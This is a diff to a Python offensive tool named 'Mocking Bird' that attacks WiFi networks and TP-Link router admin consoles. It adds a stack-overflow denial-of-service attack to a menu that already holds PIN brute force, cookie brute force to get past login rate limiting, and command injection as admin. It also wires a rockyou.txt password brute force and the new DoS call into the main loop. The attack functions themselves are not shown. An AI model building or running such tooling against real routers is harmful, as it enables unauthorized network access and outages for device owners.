@@ -12,10 +12,13 @@ ATTACKS = [
     ("PIN Brute", "Perform a brute force attack on the WiFi Pin for unauthorized access."),
     ("Check Admin Status",   "Identify if the Admin is actively logged in and editing the configuration settings."),
     ("Admin Login Brute Force", "Bypass auth rate limiting by brute forcing authorization cookies."),
-    ("Command Injection", "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)")
-    ("De-Auth",   "Identify other devices on the network and attempt to de-authenticate the ones you don't like."),
+    ("Command Injection", "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)"),
+    ("Denial of Service (DoS)",   "Utilize a Stack Overflow to take down the Admin console (Requires physical restart to fix)"),
 ]
 
+URL = ""
+PASSWORD = ""
+IP = ""
 def check_admin() -> None:
     if os.getuid() != 0:
         sys.exit("[ERROR] Mocking Bird must be run as root")
@@ -288,10 +291,12 @@ def main() -> None:
 
     scanner = Scanner(iface)
     scanner.start()
-
+    
     def handle_target_selection():
+        global URL
+        global IP
+        global PASSWORD
         scanner.output_paused = True 
-        
         target = select_target_menu(scanner.snapshot())
         if target:
             result = attack_menu_direct(target)
@@ -301,12 +306,20 @@ def main() -> None:
                     case 1:
                         ssid_brute(target["SSID"])
                     case 2:
-                        url = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
-                        query_admin_status(url)
+                        if not URL:
+                            URL = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+                        query_admin_status(URL)
                     case 3:
                         password_list = "rockyou.txt"
-                        url = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
-                        brute_force_login(url, password_list)
+                        if not URL:
+                            URL = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+                        PASSWORD = brute_force_login(URL, password_list)
+                    case 4:
+                        print("Dhruv Kandula")
+                    case 5:
+                        if not IP:
+                            IP = str(input("[!] Enter IP of the TP-Link Router:").strip())
+                        dos_admin_portal(IP)
         
         print("\n[*] Returning to monitoring view...")
         scanner.output_paused = False
